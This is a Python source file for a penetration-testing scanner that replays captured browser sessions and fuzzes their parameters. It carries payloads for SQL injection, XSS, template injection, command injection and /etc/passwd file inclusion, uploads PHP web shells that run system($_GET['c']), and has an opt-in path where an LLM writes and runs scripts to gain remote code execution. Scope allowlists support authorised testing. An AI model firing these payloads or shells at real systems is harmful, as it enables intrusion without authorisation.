#!/usr/bin/env python3
"""
HAR-Based VAPT Engine for Vikramaditya Platform — v2
Replays HAR session data, fuzzes ALL parameters (GET + POST), validates findings.
"""

import json
import re
import requests
import time
import urllib3
from copy import deepcopy
from datetime import datetime
from typing import Dict, List, Optional
from urllib.parse import urlparse, urlencode, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Payloads ──────────────────────────────────────────────────────────────────

SQLI_ERROR = [
    "' OR '1'='1",
    "' OR '1'='1'--",
    "admin'--",
    "' UNION SELECT NULL FROM DUAL--",
    "' UNION SELECT NULL,NULL FROM DUAL--",
    "1' AND '1'='2",
    "') OR ('1'='1",
]
SQLI_TIME_ORACLE = "' || dbms_pipe.receive_message('a',{delay}) || '"
SQLI_TIME_MYSQL  = "' AND SLEEP({delay})-- "
SQLI_TIME_MSSQL  = "'; WAITFOR DELAY '0:0:{delay}'--"

SQL_ERROR_SIGS = [
    r'ORA-\d{4,5}', r'quoted string not properly terminated',
    r'SQL syntax.*MySQL', r'mysql_fetch', r'mysql_num_rows',
    r'Unclosed quotation mark', r'ODBC SQL Server Driver',
    r'Microsoft OLE DB', r'SQLite.*error', r'pg_query',
    r'PSQLException', r'syntax error at or near',
]

XSS_PAYLOADS = [
    '<script>alert("V1KR4M")</script>',
    '"><img src=x onerror=alert("V1KR4M")>',
    "';alert('V1KR4M');//",
    '<svg/onload=alert("V1KR4M")>',
    '{{7*7}}',
    '${7*7}',
]

CMDI_PAYLOADS = ['; id', '| id', '$(id)', '`id`']

LFI_PAYLOADS = [
    '../../../etc/passwd',
    '....//....//....//etc/passwd',
    'php://filter/convert.base64-encode/resource=../include/set_env.php',
]

UPLOAD_SHELLS = {
    'shell.php':      ('<?php echo "V1KR4M_RCE"; system($_GET["c"]); ?>', 'application/x-php'),
    'shell.phtml':    ('<?php echo "V1KR4M_RCE"; system($_GET["c"]); ?>', 'application/x-httpd-php'),
    'shell.php.jpg':  ('<?php echo "V1KR4M_RCE"; ?>', 'image/jpeg'),
    'shell.jsp':      ('<%out.print("V1KR4M_RCE");%>', 'application/x-jsp'),
}

# ── Helpers ───────────────────────────────────────────────────────────────────

_SQL_RE = [re.compile(p, re.I) for p in SQL_ERROR_SIGS]

def _has_sql_error(text: str) -> Optional[str]:
    for rx in _SQL_RE:
        m = rx.search(text)
        if m:
            return m.group()
    return None

def _is_static(path: str) -> bool:
    return bool(re.search(r'\.(js|css|png|jpg|gif|svg|woff2?|ttf|ico|mp3|map)(\?|$)', path, re.I))

def _skip_params():
    return {'els', 'ols', 'session_id', 'angular', 'output', 'jsversion',
            'uitype', 'build_ver', 'tsoffset', 'offset_timezone', 'tzcode',
            'timestamp', 'spendTime', 'compose_key'}


class HARVAPTEngine:
    """Replays HAR requests, fuzzes parameters, validates findings."""

    def __init__(self, har_analysis: Dict, output_dir: str = None,
                 allowed_hosts: Optional[List[str]] = None,
                 enable_brain: bool = False):
        self.analysis = har_analysis
        self.session_data = har_analysis.get('session_data', {})
        self.endpoints = har_analysis.get('endpoints', [])
        self.attack_surface = har_analysis.get('attack_surface', {})
        self.config = har_analysis.get('config', {})
        self.output_dir = output_dir

        # ── Engagement scope allowlist ────────────────────────────────────
        # A real HAR routinely mixes third-party hosts (analytics, CDN, SSO/
        # IdP, ad networks). Firing active payloads — or the autonomous brain
        # scanner — at those is an out-of-scope attack the operator never
        # authorised. brain_scanner's scopeguard only blocks the operator's
        # OWN machine, NOT third-party hosts, so it cannot stand in for an
        # engagement allowlist. We fail CLOSED: if no explicit allowlist is
        # supplied, the in-scope set is the single first-seen target host
        # (config['target_domain']). Any other host is dropped with a logged
        # degradation marker.
        self.allowed_hosts = self._build_allowlist(allowed_hosts)
        self._dropped_hosts: set = set()

        # The brain_scanner path is autonomous LLM-writes-and-EXECUTES-code:
        # it must be an explicit operator opt-in (default OFF), matching the
        # `--with-brain` posture used elsewhere in the platform. Even when
        # enabled it is still hard-gated by the engagement allowlist below.
        self.enable_brain = bool(enable_brain)

        self.session = requests.Session()
        self.session.verify = False
        self.session.timeout = 20
        self._configure_session()

        self.vulnerabilities: List[Dict] = []
        self.test_results: Dict = {}
        self._tested = 0

    # ── Engagement-scope filtering ────────────────────────────────────────

    @staticmethod
    def _norm_host(host: str) -> str:
        """Lowercase, strip an explicit port and trailing dot for comparison."""
        if not host:
            return ''
        host = host.strip().lower().rstrip('.')
        # Drop credentials / port (urlparse already strips creds for .hostname,
        # but a bare netloc like 'host:8443' still carries the port).
        if '@' in host:
            host = host.rsplit('@', 1)[1]
        if host.startswith('['):  # IPv6 literal [::1]:8443
            host = host[1:].split(']', 1)[0]
        elif ':' in host:
            host = host.split(':', 1)[0]
        return host

    def _build_allowlist(self, allowed_hosts: Optional[List[str]]) -> set:
        scope = set()
        for h in (allowed_hosts or []):
            n = self._norm_host(h)
            if n:
                scope.add(n)
        if not scope:
            # Fail closed: only the first-seen target host is authorised.
            target = self.config.get('target_domain', '')
            n = self._norm_host(target)
            if n:
                scope.add(n)
        return scope

    def _in_scope(self, url: str) -> bool:
        """True iff ``url``'s host is in the engagement allowlist.

        Fail CLOSED: an empty allowlist (no target_domain, no explicit hosts)
        means NOTHING is in scope rather than everything.
        """
        if not self.allowed_hosts:
            return False
        host = self._norm_host(urlparse(url).netloc)
        if not host:
            return False
        return host in self.allowed_hosts

    def _scope_filter(self, endpoints: List[Dict]) -> List[Dict]:
        """Drop endpoints whose host is out of scope, recording each dropped
        host once so coverage loss is never silent."""
        kept = []
        for ep in endpoints:
            url = ep.get('url', '')
            if self._in_scope(url):
                kept.append(ep)
            else:
                host = self._norm_host(urlparse(url).netloc)
                if host and host not in self._dropped_hosts:
                    self._dropped_hosts.add(host)
                    print(f"   ⚠️  [SCOPE] Dropping out-of-scope host '{host}' "
                          f"(not in engagement allowlist {sorted(self.allowed_hosts)})")
        return kept

    # ── Session setup ─────────────────────────────────────────────────────

    def _configure_session(self):
        cookies = self.session_data.get('cookies', {})
        for name, value in cookies.items():
            self.session.cookies.set(name, value)
        headers = self.session_data.get('headers', {})
        if headers:
            self.session.headers.update(headers)
        self.session.headers.setdefault(
            'User-Agent',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36')

    # ── Logging ───────────────────────────────────────────────────────────

    def _log(self, severity: str, vuln_type: str, url: str, detail: str,
             evidence: str = "", param: str = "", payload: str = ""):
        # Dedup on (type, endpoint, parameter). The file-upload tester probes
        # the same (url, field) with multiple shell extensions; emitting 12
        # copies of the same "Accepted, Unverified" per endpoint drowns the
        # report. Keep the first hit, count the rest silently.
        endpoint_key = url.split('?')[0]
        dup_key = (vuln_type, endpoint_key, param)
        if not hasattr(self, '_emitted_keys'):
            self._emitted_keys = set()
        if dup_key in self._emitted_keys:
            return
        self._emitted_keys.add(dup_key)

        v = {
            'timestamp': datetime.now().isoformat(),
            'type': vuln_type,
            'severity': severity,
            'endpoint': endpoint_key,
            'full_url': url[:500],
            'details': detail,
            'evidence': evidence[:500],
            'parameter': param,
            'payload': payload[:200],
        }
        self.vulnerabilities.append(v)
        icon = {'critical': '🔴', 'high': '🟠', 'medium': '🟡', 'low': '🔵'}.get(severity, '⚪')
        print(f"   {icon} [{severity.upper()}] {vuln_type}: {endpoint_key}")
        print(f"      {detail[:120]}")

    # ── Collect fuzzable targets from HAR ─────────────────────────────────

    def _fuzzable_endpoints(self) -> List[Dict]:
        """Return POST/GET endpoints that have parameters and are not static."""
        targets = []
        skip = _skip_params()
        for ep in self.endpoints:
            if _is_static(ep.get('path', '')):
                continue
            if ep.get('status_code', 0) in (0, 301, 302, 304, 404):
                continue
            fuzz_params = {}
            for p, v in ep.get('post_params', {}).items():
                if p.lower() not in skip and p not in ('login',):
                    fuzz_params[p] = v[0] if isinstance(v, list) and v else str(v)
            for p, v in ep.get('query_params', {}).items():
                if p.lower() not in skip and p not in ('login',):
                    fuzz_params[p] = v[0] if isinstance(v, list) and v else str(v)
            if fuzz_params:
                targets.append({**ep, '_fuzz_params': fuzz_params})
        return self._scope_filter(targets)

    def _real_upload_endpoints(self) -> List[Dict]:
        """Return only endpoints that actually had multipart file uploads in the HAR."""
        return self._scope_filter([
            ep for ep in self.endpoints
            if ep.get('has_file_upload') and ep.get('method') in ('POST', 'PUT')])

    def _auth_endpoints(self) -> List[Dict]:
        """Return endpoints that serve dynamic content and should require auth."""
        out = []
        for ep in self.endpoints:
            if _is_static(ep.get('path', '')):
                continue
            if ep.get('method') != 'POST':
                continue
            if ep.get('status_code', 0) != 200:
                continue
            ct = ep.get('content_type', '')
            if 'json' in ct or 'html' in ct:
                out.append(ep)
        return self._scope_filter(out)

    # ── SQL Injection ─────────────────────────────────────────────────────

    def test_sql_injection(self) -> Dict:
        print("\n🧪 SQL Injection (error + time-based on ALL POST/GET params)...")
        results = {'tested': 0, 'vulnerable': [], 'payloads_tested': 0}
        targets = self._fuzzable_endpoints()
        print(f"   Targets: {len(targets)} endpoints with fuzzable params")

        for ep in targets:
            url = ep['url']
            method = ep['method']
            base_params = dict(ep.get('post_params', {}))
            # flatten list values
            for k, v in base_params.items():
                if isinstance(v, list):
                    base_params[k] = v[0]

            for param, orig_val in ep['_fuzz_params'].items():
                # ── Error-based ──
                for payload in SQLI_ERROR:
                    results['payloads_tested'] += 1
                    test_params = {**base_params, param: payload}
                    try:
                        if method == 'POST':
                            r = self.session.post(url.split('?')[0], data=test_params, timeout=15)
                        else:
                            r = self.session.get(url.split('?')[0], params=test_params, timeout=15)
                        match = _has_sql_error(r.text)
                        if match:
                            self._log('critical', 'SQL Injection (Error)', url,
                                      f"DB error '{match}' in param '{param}'",
                                      evidence=r.text[:300], param=param, payload=payload)
                            results['vulnerable'].append(url)
                            break
                    except Exception:
                        pass

                # ── Time-based ──
                for tpl in [SQLI_TIME_ORACLE, SQLI_TIME_MYSQL, SQLI_TIME_MSSQL]:
                    results['payloads_tested'] += 1
                    delay = 5
                    payload = tpl.format(delay=delay)
                    test_params = {**base_params, param: payload}
                    try:
                        t0 = time.time()
                        if method == 'POST':
                            self.session.post(url.split('?')[0], data=test_params, timeout=delay + 10)
                        else:
                            self.session.get(url.split('?')[0], params=test_params, timeout=delay + 10)
                        elapsed = time.time() - t0
                        if elapsed >= delay - 0.5:
                            # The first 5s-payload hit was slow, but a single
                            # slow sample is indistinguishable from network
                            # jitter / a GC pause / a cold cache. CONFIRM
                            # differentially: (a) re-run the SAME long payload
                            # and require the delay to REPRODUCE (defeats a
                            # one-off spike), and (b) run the short (1s) payload
                            # as a fast baseline. Only when long reproduces AND
                            # short is fast is this a genuine time-based SQLi.
                            t_long = time.time()
                            if method == 'POST':
                                self.session.post(url.split('?')[0], data=test_params, timeout=delay + 10)
                            else:
                                self.session.get(url.split('?')[0], params=test_params, timeout=delay + 10)
                            elapsed_long2 = time.time() - t_long

                            payload2 = tpl.format(delay=1)
                            test_params2 = {**base_params, param: payload2}
                            t1 = time.time()
                            if method == 'POST':
                                self.session.post(url.split('?')[0], data=test_params2, timeout=12)
                            else:
                                self.session.get(url.split('?')[0], params=test_params2, timeout=12)
                            elapsed2 = time.time() - t1

                            if (elapsed >= delay - 0.5
                                    and elapsed_long2 >= delay - 0.5
                                    and elapsed2 < delay - 0.5):
                                self._log('critical', 'SQL Injection (Time-Based)', url,
                                          f"Delay reproduced ({elapsed:.1f}s, {elapsed_long2:.1f}s with {delay}s) "
                                          f"vs {elapsed2:.1f}s with 1s in param '{param}'",
                                          param=param, payload=payload)
                                results['vulnerable'].append(url)
                    except Exception:
                        pass

            results['tested'] += 1

        self.test_results['sql_injection'] = results
        return results

    # ── XSS ───────────────────────────────────────────────────────────────

    def test_xss(self) -> Dict:
        print("\n🧪 XSS (reflected + SSTI on ALL params)...")
        results = {'tested': 0, 'vulnerable': [], 'payloads_tested': 0}
        targets = self._fuzzable_endpoints()

        for ep in targets:
            url = ep['url']
            method = ep['method']
            base_params = {k: (v[0] if isinstance(v, list) else v)
                           for k, v in ep.get('post_params', {}).items()}

            for param in ep['_fuzz_params']:
                for payload in XSS_PAYLOADS:
                    results['payloads_tested'] += 1
                    test_params = {**base_params, param: payload}
                    try:
                        if method == 'POST':
                            r = self.session.post(url.split('?')[0], data=test_params, timeout=15)
                        else:
                            r = self.session.get(url.split('?')[0], params=test_params, timeout=15)
                        body = r.text
                        # Reflected XSS
                        if payload in body:
                            ctx = body[max(0, body.find(payload)-40):body.find(payload)+len(payload)+40]
                            if 'value="' not in ctx and "value='" not in ctx:
                                self._log('high', 'Reflected XSS', url,
                                          f"Payload reflected in param '{param}'",
                                          evidence=ctx, param=param, payload=payload)
                                results['vulnerable'].append(url)
                                break
                    except Exception:
                        pass
                # SSTI is confirmed by a dedicated evaluation probe (NOT the '49 in
                # body' substring heuristic, which fired on any page containing 49 —
                # friends full-tool review F4). Run once per param.
                if self._probe_ssti(url, method, base_params, param):
                    results['vulnerable'].append(url)
            results['tested'] += 1
        self.test_results['xss'] = results
        return results

    def _probe_ssti(self, url: str, method: str, base_params: dict, param: str) -> bool:
        """Confirm server-side template / EL injection by EVALUATION, not substring.

        friends full-tool review F4: the old check flagged CRITICAL SSTI whenever
        ``49`` appeared in the body after injecting ``{{7*7}}`` — so any page with
        a price/id/"49 results" was a fabricated CRITICAL. This probe instead:
          1. uses a DISTINCTIVE arithmetic canary whose product is improbable in
             normal content (coincidental substring match is negligible);
          2. confirms the product is ABSENT from a baseline (un-injected) response,
             so dynamic content that already contains the number can't false-fire;
          3. requires the raw expression NOT to be reflected verbatim — a template
             that is echoed unevaluated is reflection, not SSTI.
        Returns True and logs a CRITICAL finding on confirmation.
        """
        base = url.split('?')[0]
        # Distinctive operands (computed, so no manual-arithmetic risk).
        a, b = 91193, 90007
        product = str(a * b)

        def _fetch(value):
            params = {**base_params, param: value}
            try:
                if method == 'POST':
                    r = self.session.post(base, data=params, timeout=15)
                else:
                    r = self.session.get(base, params=params, timeout=15)
                return r.text or ""
            except Exception:
                return None

        baseline = _fetch("vapt_ssti_baseline")
        if baseline is None or product in baseline:
            # Request failed, or the number already appears un-injected — cannot
            # attribute a later match to evaluation. Do NOT fire (anti-fabrication).
            return False

        for expr_tmpl, label in (("{{%d*%d}}", "SSTI"), ("${%d*%d}", "SSTI (EL)")):
            expr = expr_tmpl % (a, b)
            body = _fetch(expr)
            if body is None:
                continue
            # Evaluated: product present, AND neither the wrapped expression nor the
            # bare "a*b" echoed back (those would be reflection, not evaluation).
            if product in body and expr not in body and f"{a}*{b}" not in body:
                idx = body.find(product)
                self._log('critical', label, url,
                          f"Template expression evaluated in param '{param}' "
                          f"({a}*{b} rendered as {product})",
                          evidence=body[max(0, idx - 40):idx + len(product) + 40],
                          param=param, payload=expr)
                return True
        return False

    # ── Command Injection ─────────────────────────────────────────────────

    def test_command_injection(self) -> Dict:
        print("\n🧪 Command Injection on ALL params...")
        results = {'tested': 0, 'vulnerable': [], 'payloads_tested': 0}
        targets = self._fuzzable_endpoints()

        for ep in targets:
            url = ep['url']
            method = ep['method']
            base_params = {k: (v[0] if isinstance(v, list) else v)
                           for k, v in ep.get('post_params', {}).items()}

            for param in ep['_fuzz_params']:
                for payload in CMDI_PAYLOADS:
                    results['payloads_tested'] += 1
                    test_params = {**base_params, param: payload}
                    try:
                        if method == 'POST':
                            r = self.session.post(url.split('?')[0], data=test_params, timeout=15)
                        else:
                            r = self.session.get(url.split('?')[0], params=test_params, timeout=15)
                        if re.search(r'uid=\d+\(', r.text):
                            self._log('critical', 'Command Injection', url,
                                      f"OS command output in param '{param}'",
                                      evidence=r.text[:300], param=param, payload=payload)
                            results['vulnerable'].append(url)
                            break
                    except Exception:
                        pass
            results['tested'] += 1

        self.test_results['command_injection'] = results
        return results

    # ── LFI ───────────────────────────────────────────────────────────────

    def test_lfi(self) -> Dict:
        print("\n🧪 LFI / Path Traversal on ALL params...")
        results = {'tested': 0, 'vulnerable': [], 'payloads_tested': 0}
        targets = self._fuzzable_endpoints()

        for ep in targets:
            url = ep['url']
            method = ep['method']
            base_params = {k: (v[0] if isinstance(v, list) else v)
                           for k, v in ep.get('post_params', {}).items()}

            for param in ep['_fuzz_params']:
                for payload in LFI_PAYLOADS:
                    results['payloads_tested'] += 1
                    test_params = {**base_params, param: payload}
                    try:
                        if method == 'POST':
                            r = self.session.post(url.split('?')[0], data=test_params, timeout=15)
                        else:
                            r = self.session.get(url.split('?')[0], params=test_params, timeout=15)
                        if re.search(r'root:.*:0:0:|bin/bash|bin/sh', r.text):
                            self._log('critical', 'Local File Inclusion', url,
                                      f"/etc/passwd content in param '{param}'",
                                      evidence=r.text[:300], param=param, payload=payload)
                            results['vulnerable'].append(url)
                            break
                    except Exception:
                        pass
            results['tested'] += 1

        self.test_results['lfi'] = results
        return results

    # ── File Upload ───────────────────────────────────────────────────────

    def test_file_upload(self) -> Dict:
        print("\n🧪 File Upload RCE (real multipart endpoints only)...")
        results = {'tested': 0, 'vulnerable': [], 'uploaded': []}
        upload_eps = self._real_upload_endpoints()
        print(f"   Real upload endpoints: {len(upload_eps)}")

        for ep in upload_eps:
            url = ep['url']
            results['tested'] += 1

            # Extract the actual file param name from HAR postData
            file_params = set()
            # Check original HAR entry for param names (from postData.params)
            for param_name in ep.get('post_params', {}).keys():
                file_params.add(param_name)
            if not file_params:
                file_params = {'file', 'upload', 'upfile', 'upfile1'}

            for fname, (content, mime) in UPLOAD_SHELLS.items():
                for param in file_params:
                    try:
                        r = self.session.post(url, files={param: (fname, content, mime)}, timeout=20)
                        body = r.text.lower()
                        if r.status_code == 200 and 'success' in body:
                            # VALIDATE: try to access the uploaded file
                            parsed = urlparse(url)
                            base = f"{parsed.scheme}://{parsed.netloc}"
                            check_paths = [
                                f"/upload/{fname}", f"/uploads/{fname}",
                                f"/rcloud/file/{fname}", f"/files/{fname}",
                                f"/tmp/{fname}", f"/attachments/{fname}",
                            ]
                            confirmed = False
                            for cp in check_paths:
                                try:
                                    cr = self.session.get(f"{base}{cp}", timeout=10)
                                    if 'V1KR4M_RCE' in cr.text:
                                        self._log('critical', 'File Upload RCE (Confirmed)', url,
                                                  f"Shell '{fname}' uploaded+accessible at {cp}",
                                                  evidence=cr.text[:200], param=param)
                                        results['vulnerable'].append(url)
                                        results['uploaded'].append({'file': fname, 'path': cp})
                                        confirmed = True
                                        break
                                    if cr.status_code == 200 and ('<?php' in cr.text or '<%' in cr.text):
                                        self._log('high', 'File Upload (Stored, Not Executing)', url,
                                                  f"Shell '{fname}' stored at {cp} but PHP disabled",
                                                  param=param)
                                        confirmed = True
                                        break
                                except Exception:
                                    pass
                            if not confirmed:
                                # Upload accepted but can't find the file — medium
                                self._log('medium', 'File Upload (Accepted, Unverified)', url,
                                          f"Server accepted '{fname}' via '{param}' — cannot verify storage",
                                          param=param)
                                
                                # Ask the brain to try harder to find it and get RCE by writing a script.
                                # GATE 1 — explicit operator opt-in. This path is an autonomous
                                # LLM that writes and EXECUTES code; it must never fire on a bare
                                # run. Default OFF; enable with `--with-brain`.
                                if not self.enable_brain:
                                    continue
                                # GATE 2 — HARD scope gate: the autonomous LLM-writes-and-executes
                                # path must never run against a host outside the engagement
                                # allowlist. brain_scanner's scopeguard only blocks the operator's
                                # own machine, so we cannot delegate this check to it — assert here.
                                if not self._in_scope(url):
                                    host = self._norm_host(urlparse(url).netloc)
                                    print(f"   ⚠️  [SCOPE] Refusing brain scan on out-of-scope "
                                          f"host '{host}' (not in allowlist {sorted(self.allowed_hosts)})")
                                    continue
                                try:
                                    import os
                                    from brain_scanner import run_brain_scanner
                                    print(f"\n   🧠 [BRAIN] Asking AI to write a script to find the uploaded shell '{fname}' on '{url}'")
                                    cookies_str = "; ".join([f"{c.name}={c.value}" for c in self.session.cookies])
                                    briefing = f"File upload accepted at {url}. File: {fname}. Parameter: {param}. I cannot find the uploaded file at standard paths like /upload/{fname}. Write a script to fuzz directories and find the uploaded shell, and try to get RCE. You must write a complete Python script that searches for the uploaded file and executes a command."
                                    # Persist brain output to disk when a session dir exists, and
                                    # capture the returned findings so a confirmed RCE is recorded.
                                    brain_out = None
                                    if self.output_dir:
                                        # param is a HAR form-field name → sanitize before using it
                                        # as a path component (a '/' or '..' would escape the dir).
                                        safe_param = re.sub(r'[^A-Za-z0-9_.-]', '_', param) or 'field'
                                        brain_out = os.path.join(self.output_dir, 'brain', f'upload_{safe_param}')
                                        os.makedirs(brain_out, exist_ok=True)
                                    brain_findings = run_brain_scanner(target=url, briefing=briefing, cookies=cookies_str, mode='scan', max_iterations=2, output_dir=brain_out)
                                    bf_lines = [bf.strip() for bf in (brain_findings or []) if bf and bf.strip()]
                                    if bf_lines:
                                        # run_brain_scanner returns two kinds of line: script-grounded
                                        # findings (from actual tool stdout) and unverified model prose
                                        # tagged "[MODEL CLAIM — verify PoC]". Severity must derive ONLY
                                        # from script-grounded evidence — a model claim containing
                                        # "EXPLOITABLE" must not escalate this to critical.
                                        script_lines = [l for l in bf_lines if not l.upper().startswith('[MODEL CLAIM')]
                                        joined = '\n'.join(bf_lines)  # keep all lines in the detail for context
                                        grounded = ' '.join(script_lines).upper()
                                        if any(k in grounded for k in ('RCE', 'EXPLOITABLE')):
                                            sev = 'critical'
                                        elif script_lines:
                                            sev = 'high'
                                        else:
                                            sev = 'medium'  # model claims only — investigated, unconfirmed
                                        # One _log call: multiple distinct confirmed lines (e.g. path
                                        # discovery + RCE command output) share the same (type, endpoint,
                                        # param) dedup key, so per-line calls would collapse to the first.
                                        self._log(sev, 'File Upload RCE (Brain-Investigated)', url, joined, param=param)
                                except ImportError:
                                    pass
                    except Exception:
                        pass

        self.test_results['file_upload'] = results
        return results

    # ── Authentication Bypass ─────────────────────────────────────────────

    @staticmethod
    def _is_success_response(resp) -> bool:
        """True iff the response body signals a genuine authenticated success.

        The previous heuristic ``'"success"' in text`` matched both
        ``{"success":true}`` (real hit) and ``{"success":false,"error":true,
        "code":440,"message":"invalid session."}`` (unauth error) — producing
        false-positive HIGH 'Authentication Bypass' findings for any error
        payload that mentioned the field name. Now we parse the JSON and
        require ``success == True`` with no error markers.
        """
        if resp.status_code >= 400 or resp.status_code in (301, 302):
            return False
        # Reject the common "session expired / invalid" error codes even if 200.
        for marker in ("invalid session", "invalid_session",
                       "session expired", "not authenticated",
                       "authentication required", "unauthorized",
                       "please log in", "please login"):
            if marker in resp.text.lower():
                return False
        body = resp.text
        if not body:
            return False
        try:
            parsed = json.loads(body)
        except ValueError:
            # Non-JSON body — fall back to the old heuristic but require the
            # explicit ``"success":true`` rather than bare field presence.
            return '"success":true' in body.lower() or '"success": true' in body.lower()
        if not isinstance(parsed, dict):
            return False
        # Explicit error markers win — e.g. {"success":false,"error":true}
        if parsed.get('error') is True:
            return False
        status_val = parsed.get('status')
        if isinstance(status_val, bool) and status_val is False:
            return False
        if isinstance(status_val, str) and status_val.lower() in ('error', 'fail', 'failure'):
            return False
        if parsed.get('code') in (401, 403, 440):
            return False
        if parsed.get('success') is True:
            return True
        # Body lacks any success flag — treat as ambiguous, not a bypass.
        return False

    @staticmethod
    def _body_identity(text: str) -> str:
        """Stable content fingerprint used to decide whether two successful
        responses represent the SAME record or DIFFERENT records.

        Hashes the response body with volatile tokens (whitespace, digit runs
        that are usually timestamps/counters, CSRF nonces) normalised out, so a
        re-fetch of the operator's OWN record collapses to the same identity
        while another user's record yields a different one. Used by the IDOR
        detector to distinguish a real cross-record disclosure from a size
        delta caused by padding / a generic page.
        """
        import hashlib
        if not text:
            return ''
        norm = re.sub(r'\s+', ' ', text).strip().lower()
        # Collapse long digit runs (ids/timestamps) so re-fetching the same
        # record is identity-stable, but keep short alpha-numeric content that
        # actually distinguishes one user's record from another's.
        norm = re.sub(r'\d{4,}', '#', norm)
        return hashlib.sha256(norm.encode('utf-8', 'replace')).hexdigest()

    def test_auth_bypass(self) -> Dict:
        print("\n🧪 Authentication Bypass (dynamic endpoints only)...")
        results = {'tested': 0, 'vulnerable': []}
        auth_eps = self._auth_endpoints()
        print(f"   Dynamic POST endpoints: {len(auth_eps)}")

        unauth = requests.Session()
        unauth.verify = False
        unauth.timeout = 15
        unauth.headers['User-Agent'] = self.session.headers.get('User-Agent', '')

        for ep in auth_eps:
            url = ep['url']
            results['tested'] += 1

            # Get authenticated baseline.
            try:
                auth_r = self.session.post(url, data=ep.get('post_params', {}), timeout=15)
                auth_size = len(auth_r.text)
                auth_has_data = self._is_success_response(auth_r)
            except Exception:
                continue

            if not auth_has_data:
                continue  # endpoint doesn't return a genuine success with auth — skip

            # Test without cookies.
            try:
                noauth_r = unauth.post(url, data=ep.get('post_params', {}), timeout=15)
            except Exception:
                continue

            if not self._is_success_response(noauth_r):
                continue  # server correctly rejected — not a bypass
            # Response body must also be shape-similar to the authenticated one —
            # a generic 200 landing page would size-diverge sharply.
            if abs(len(noauth_r.text) - auth_size) >= 50:
                continue

            self._log('high', 'Authentication Bypass', url,
                      "Endpoint returns authenticated data without session cookies",
                      evidence=noauth_r.text[:200])
            results['vulnerable'].append(url)

        self.test_results['auth_bypass'] = results
        return results

    # ── IDOR ──────────────────────────────────────────────────────────────

    def test_idor(self) -> Dict:
        print("\n🧪 IDOR (parameter manipulation)...")
        results = {'tested': 0, 'vulnerable': []}
        targets = self._fuzzable_endpoints()

        # Find endpoints with user/id-like params
        idor_targets = []
        for ep in targets:
            for param in ep['_fuzz_params']:
                if any(x in param.lower() for x in ['user', 'login', 'email', 'id', 'uid', 'userid']):
                    idor_targets.append((ep, param))

        print(f"   IDOR targets: {len(idor_targets)} param/endpoint combos")

        for ep, param in idor_targets:
            url = ep['url']
            method = ep['method']
            base_params = {k: (v[0] if isinstance(v, list) else v)
                           for k, v in ep.get('post_params', {}).items()}
            results['tested'] += 1

            # Get baseline
            try:
                if method == 'POST':
                    base_r = self.session.post(url.split('?')[0], data=base_params, timeout=15)
                else:
                    base_r = self.session.get(url, timeout=15)
                base_size = len(base_r.text)
                base_ident = self._body_identity(base_r.text)
            except Exception:
                continue

            # Try different user values
            for test_val in ['admin@test.com', 'test@test.com', 'user2@test.com', '1', '2', '999']:
                test_params = {**base_params, param: test_val}
                try:
                    if method == 'POST':
                        r = self.session.post(url.split('?')[0], data=test_params, timeout=15)
                    else:
                        r = self.session.get(url.split('?')[0], params=test_params, timeout=15)
                    # Signal an IDOR only when the server returns a GENUINE success
                    # (case-insensitive, schema-aware — same parser auth_bypass uses,
                    # not a hard-coded '"Success"' substring) AND that success body
                    # is a DIFFERENT record than the operator's own baseline
                    # (different content identity, not merely a size delta which a
                    # generic error page or padding can trivially satisfy).
                    if not self._is_success_response(r):
                        continue
                    test_ident = self._body_identity(r.text)
                    if test_ident != base_ident and abs(len(r.text) - base_size) > 100:
                        self._log('high', 'IDOR', url,
                                  f"Different successful record returned for '{param}'={test_val} "
                                  f"(delta {len(r.text)-base_size}b, content identity differs)",
                                  evidence=r.text[:200], param=param)
                        results['vulnerable'].append(url)
                        break
                except Exception:
                    pass

        self.test_results['idor'] = results
        return results

    # ── Header Security ───────────────────────────────────────────────────

    def test_security_headers(self) -> Dict:
        print("\n🧪 Security Header Audit...")
        results = {'tested': 0, 'issues': []}

        domains = self.attack_surface.get('domains', [])
        required = {
            'Strict-Transport-Security': 'Missing HSTS',
            'X-Content-Type-Options': 'Missing X-Content-Type-Options',
            'X-Frame-Options': 'Missing clickjacking protection',
            'Content-Security-Policy': 'Missing CSP',
        }

        for domain in domains:
            # Only probe in-scope hosts — `domains` is harvested verbatim from
            # the HAR and may include third-party (analytics/CDN/SSO) hosts.
            if not self._in_scope(f"https://{domain}/"):
                host = self._norm_host(domain)
                if host and host not in self._dropped_hosts:
                    self._dropped_hosts.add(host)
                    print(f"   ⚠️  [SCOPE] Skipping out-of-scope host '{host}' "
                          f"in header audit")
                continue
            results['tested'] += 1
            try:
                r = self.session.get(f"https://{domain}/", timeout=10)
                for hdr, msg in required.items():
                    if hdr.lower() not in {k.lower() for k in r.headers}:
                        self._log('low', 'Missing Security Header', f"https://{domain}/",
                                  f"{msg} ({hdr})")
                        results['issues'].append(f"{domain}: {msg}")

                # Cookie audit
                for cookie in r.cookies:
                    issues = []
                    if not cookie.secure:
                        issues.append('no Secure flag')
                    if 'httponly' not in str(cookie._rest).lower():
                        issues.append('no HttpOnly')
                    if issues:
                        self._log('medium', 'Insecure Cookie', f"https://{domain}/",
                                  f"Cookie '{cookie.name}': {', '.join(issues)}")

                # TRACE method
                try:
                    tr = self.session.request('TRACE', f"https://{domain}/", timeout=10)
                    if tr.status_code == 200 and 'TRACE' in tr.text:
                        self._log('medium', 'HTTP TRACE Enabled', f"https://{domain}/",
                                  "TRACE method reflects request headers (XST risk)")
                except Exception:
                    pass

            except Exception:
                pass

        self.test_results['security_headers'] = results
        return results

    # ── Run All ───────────────────────────────────────────────────────────

    def run_comprehensive_scan(self) -> Dict:
        target = self.config.get('target_domain', 'Unknown')
        fuzzable = self._fuzzable_endpoints()
        uploads = self._real_upload_endpoints()

        print(f"🚀 Starting comprehensive VAPT scan...")
        print(f"📊 Target: {target}")
        print(f"🔒 In-scope hosts (allowlist): {sorted(self.allowed_hosts) or '(none — fail-closed)'}")
        print(f"🎯 Total endpoints: {len(self.endpoints)}")
        print(f"🔧 Fuzzable endpoints: {len(fuzzable)} (with {sum(len(e['_fuzz_params']) for e in fuzzable)} params)")
        print(f"📁 Real upload endpoints: {len(uploads)}")

        t0 = time.time()

        self.test_sql_injection()
        self.test_xss()
        self.test_command_injection()
        self.test_lfi()
        self.test_file_upload()
        self.test_auth_bypass()
        self.test_idor()
        self.test_security_headers()

        duration = time.time() - t0

        summary = {
            'scan_info': {
                'target': target,
                'start_time': datetime.fromtimestamp(t0).isoformat(),
                'end_time': datetime.now().isoformat(),
